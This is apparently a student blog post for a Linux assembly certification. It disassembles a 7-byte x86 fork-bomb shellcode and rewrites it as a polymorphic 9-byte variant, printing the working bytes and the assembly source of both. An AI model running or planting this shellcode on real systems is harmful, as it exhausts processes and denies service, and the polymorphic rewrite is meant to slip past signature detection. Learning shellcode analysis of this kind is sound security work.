# Polymorphic conversion of three payloads - part 2

## Forkbomb

The shellcode chosen for this assignment comes from Shellstorm (Linux/x86 - forkbomb) and is located at 
<http://shell-storm.org/shellcode/files/shellcode-214.php>.

This shellcode claims to perform a fork bomb causing a denial of service on the host machine and has a length of **7 bytes**. Let's take the shellcode and decompile it.

```
> echo -ne "\x6a\x02\x58\xcd\x80\xeb\xf9" | ndisasm -b32 -

00000000  6A02              push byte +0x2
00000002  58                pop eax
00000003  CD80              int 0x80
00000005  EBF9              jmp short 0x0
```

The shellcode executes an infinite loop and call the fork syscall.

```
> man 2 fork
create a child process
pid_t fork(void);
```

Let's try to modify the syntax of the code without affecting the semantic.

```
; compile with:
; 	nasm -f elf32 shellcode-214-poly.asm
;	ld -o shellcode-214-poly shellcode-214-poly.o
; extract shellcode with:
; 	objdump -d shellcode-214-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
	_start:
		mov al,0x2  ; move the syscall number of fork in al
		and eax,0xf ; mask eax to ensure that the final value of eax is 0x2
		int 0x80    ; interrupt for calling fork syscall
		jmp _start  ; infinite loop
```

The resulting shellcode does not contains null bytes and is different from the initial one, however semantically the two shellcodes are identical. This new shellcode is *9 bytes* long.

```
\xb0\x02\x83\xe0\x0f\xcd\x80\xeb\xf7
```

Great! Analysis completed.

<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*